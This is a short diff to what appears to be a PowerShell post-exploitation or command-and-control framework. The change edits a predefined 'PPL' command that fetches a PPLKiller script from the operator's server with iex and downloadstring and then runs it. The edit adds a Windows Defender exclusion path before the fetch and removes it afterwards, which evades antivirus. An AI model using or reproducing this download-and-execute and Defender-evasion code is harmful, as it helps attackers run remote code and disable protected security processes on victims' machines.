@@ -5427,7 +5427,7 @@ function Get-Command {
 	
 	elseif ($Command -eq "PPL") {
 		$predefinedCommands = @(
-			"Write-Output '';Write-Output '[+] PPLKiller Loaded | https://github.com/Leo4j/PPLKiller';Write-Output '';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/ppl.ps1');Invoke-PPLKiller"
+			"Write-Output '';Write-Output '[+] PPLKiller Loaded | https://github.com/Leo4j/PPLKiller';Write-Output '';Add-MpPreference -ExclusionPath `"C:\Users\Public\Documents`";iex(new-object net.webclient).downloadstring('$($global:ServerURL)/ppl.ps1');Invoke-PPLKiller;Remove-MpPreference -ExclusionPath `"C:\Users\Public\Documents`""
 		)
 	}
 	
